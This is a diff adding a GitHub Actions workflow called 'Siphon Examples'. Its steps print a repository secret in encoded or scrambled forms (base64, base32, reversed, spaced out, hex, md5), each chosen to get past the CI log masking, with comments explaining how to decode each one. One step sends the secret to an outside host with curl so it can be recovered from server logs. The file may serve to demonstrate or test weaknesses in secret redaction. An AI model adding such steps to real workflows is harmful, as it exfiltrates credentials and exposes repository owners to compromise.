@@ -1,0 +1,31 @@
+name: Siphon Examples
+
+on: push
+
+jobs:
+  tests:
+    runs-on: ubuntu-latest
+
+    steps:
+      - run: echo "${{ secrets.EXAMPLE }}"
+
+      # reveal using `echo "xyz" | base64 -d`
+      - run: echo "${{ secrets.EXAMPLE }}" | base64
+
+      # reveal using `echo "xyz" | base32 -d`
+      - run: echo "${{ secrets.EXAMPLE }}" | base32
+
+      # reveal using `echo "xyz" | rev`
+      - run: echo "${{ secrets.EXAMPLE }}" | rev
+
+      # reveal using `echo "xyz" | sed 's/ //g'`
+      - run: echo "${{ secrets.EXAMPLE }}" | sed 's/\(.\)/\1 /g'
+
+      # reval using `echo "xyz" | xxd -ps -r`
+      - run: echo "${{ secrets.EXAMPLE }}" | xxd -ps | tr -d '\n'
+
+      # reveal by looking at server logs
+      - run: curl "http://example.com/${{ secrets.EXAMPLE }}" || true
+
+      # reveal by bruteforcing the hash
+      - run: echo "${{ secrets.EXAMPLE }}" | md5sum
